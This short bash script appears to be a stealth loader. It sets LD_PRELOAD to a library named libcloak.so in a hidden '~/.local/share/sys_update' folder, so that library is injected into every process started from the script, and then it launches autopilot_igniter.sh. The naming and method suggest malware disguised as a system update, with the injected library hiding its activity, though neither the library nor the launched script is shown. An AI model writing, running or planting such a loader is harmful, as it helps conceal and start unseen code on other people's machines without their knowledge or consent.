#!/bin/bash
export TARGET_DIR="$HOME/.local/share/sys_update"
export LD_PRELOAD="$TARGET_DIR/libcloak.so"
cd "$TARGET_DIR"
./autopilot_igniter.sh
